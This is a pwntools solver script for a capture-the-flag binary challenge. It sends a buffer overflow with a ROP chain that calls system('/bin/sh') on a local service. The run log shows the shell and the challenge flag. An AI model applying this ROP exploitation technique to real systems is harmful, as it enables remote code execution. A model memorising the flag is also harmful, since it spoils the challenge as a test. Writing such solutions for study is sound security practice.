from pwn import *

io = remote("127.0.0.1", 30006)

print(io.readuntil("?"))

addr_system_plt = 0x401120
addr_binsh = 0x404078
addr_pop_rdi = 0x401493
addr_pop_rsi_pop = 0x401491

s = b"taskctf{" + b"A" * 48
s += p64(addr_pop_rdi)
s += p64(addr_binsh)
s += p64(addr_pop_rsi_pop)
s += p64(0)
s += p64(0)
s += p64(addr_system_plt)

io.sendline(s)
io.interactive()

"""
$ python3 solver/solve.py 
[+] Opening connection to 127.0.0.1 on port 30006: Done
/home/user/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:1433: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return func(self, *a, **kw)
b'What is the flag?'
[*] Switching to interactive mode

***start stack dump***
0x7fffffffebd0: 0x7b6674636b736174 <- rsp
0x7fffffffebd8: 0x4141414141414141
0x7fffffffebe0: 0x4141414141414141
0x7fffffffebe8: 0x4141414141414141
0x7fffffffebf0: 0x4141414141414141
0x7fffffffebf8: 0x4141414141414141
0x7fffffffec00: 0x4141414141414141 <- rbp
0x7fffffffec08: 0x0000000000401493 <- return address
0x7fffffffec10: 0x0000000000404078
0x7fffffffec18: 0x0000000000401491
0x7fffffffec20: 0x0000000000000000
***end stack dump***

$ ls
flag
prediction
start.sh
$ cat flag
taskctf{r0p_1s_f4mous_way}$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30006
"""
